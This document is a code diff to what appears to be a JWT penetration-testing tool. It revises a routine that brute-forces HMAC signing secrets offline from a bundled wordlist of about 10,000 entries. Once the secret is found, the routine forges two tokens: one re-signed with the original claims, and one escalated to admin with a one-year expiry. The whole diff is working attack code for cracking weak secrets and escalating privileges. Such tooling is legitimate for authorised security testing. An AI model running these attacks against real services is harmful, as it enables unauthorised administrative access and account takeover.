@@ -8,6 +8,7 @@
 
 import { signHMAC, verifyHMAC } from "../crypto/jwt.js";
 import { WEAK_JWT_SECRETS } from "../wordlist.js";
+import { EXTENDED_JWT_SECRETS } from "../wordlist.generated.js";
 import type { ParsedJWT, AttackResult, PluginConfig } from "../types.js";
 import { nanoid } from "../util.js";
 
@@ -20,50 +21,71 @@ export async function buildWeakSecretAttacks(
   if (!alg.startsWith("HS")) return [];
 
   const hmacAlg = alg as "HS256" | "HS384" | "HS512";
-  const wordlist = [...WEAK_JWT_SECRETS, ...config.customWordlist];
+  // Built-in short list + the bundled ~10k extended list + user-supplied words,
+  // de-duplicated so each candidate is only tested once.
+  const wordlist = [...new Set([...WEAK_JWT_SECRETS, ...EXTENDED_JWT_SECRETS, ...config.customWordlist])];
   const results: AttackResult[] = [];
 
+  // Offline brute force: stop at the first secret that reproduces the original
+  // token's signature.
+  let matched: string | null = null;
   for (const word of wordlist) {
-    const secret = Buffer.from(word, "utf8");
-    if (!verifyHMAC(originalToken, secret, hmacAlg)) continue;
-
-    // Found a valid secret — build admin-escalated token
-    const adminPayload = {
-      ...parsed.payload,
-      role: "admin",
-      admin: true,
-      is_admin: true,
-      exp: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365,
-    };
-    const adminJwt = signHMAC(parsed.header, adminPayload, secret, hmacAlg);
-
-    // Original token resigned (no claim changes) to prove key possession
-    const resignedJwt = signHMAC(parsed.header, parsed.payload, secret, hmacAlg);
-
-    results.push({
-      id: nanoid(),
-      technique: "weakSecret",
-      techniqueName: `Weak Secret Found: "${word}"`,
-      description:
-        `Cracked the ${hmacAlg} signing secret: "${word}". ` +
-        "Provides re-signed token with elevated claims (admin=true, role=admin, +1yr exp).",
-      modifiedJWT: adminJwt,
-      timestamp: Date.now(),
-      hmacSecret: word,
-    });
-
-    results.push({
-      id: nanoid(),
-      technique: "weakSecret",
-      techniqueName: `Weak Secret Re-sign (original claims): "${word}"`,
-      description:
-        `Re-signs the original token with secret "${word}" — no claim changes. ` +
-        "Useful to verify the server accepts the cracked secret.",
-      modifiedJWT: resignedJwt,
-      timestamp: Date.now(),
-      hmacSecret: word,
-    });
+    if (verifyHMAC(originalToken, Buffer.from(word, "utf8"), hmacAlg)) {
+      matched = word;
+      break;
+    }
   }
+
+  if (matched === null) {
+    results.push({
+      id: nanoid(),
+      technique: "weakSecret",
+      techniqueName: "Weak Secret — Not Found",
+      description: `JWT secret not found in list of ${wordlist.length} secrets.`,
+      modifiedJWT: originalToken,
+      timestamp: Date.now(),
+      infoOnly: true,
+      secretsTested: wordlist.length,
+    });
+    return results;
+  }
+
+  const secret = Buffer.from(matched, "utf8");
+
+  // Re-signed with original claims — confirms the server accepts the cracked key.
+  results.push({
+    id: nanoid(),
+    technique: "weakSecret",
+    techniqueName: `Weak Secret Cracked: "${matched}"`,
+    description:
+      `Cracked the ${hmacAlg} signing secret offline: "${matched}". ` +
+      "Re-signs the original claims to confirm the server accepts the cracked key.",
+    modifiedJWT: signHMAC(parsed.header, parsed.payload, secret, hmacAlg),
+    timestamp: Date.now(),
+    hmacSecret: matched,
+    secretsTested: wordlist.length,
+  });
+
+  // Privilege escalation with the cracked secret.
+  const adminPayload = {
+    ...parsed.payload,
+    role: "admin",
+    admin: true,
+    is_admin: true,
+    exp: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365,
+  };
+  results.push({
+    id: nanoid(),
+    technique: "weakSecret",
+    techniqueName: `Weak Secret — Privilege Escalation ("${matched}")`,
+    description:
+      `Re-signs with cracked secret "${matched}" and elevated claims ` +
+      "(admin=true, role=admin, +1yr exp).",
+    modifiedJWT: signHMAC(parsed.header, adminPayload, secret, hmacAlg),
+    timestamp: Date.now(),
+    hmacSecret: matched,
+    secretsTested: wordlist.length,
+  });
 
   return results;
 }
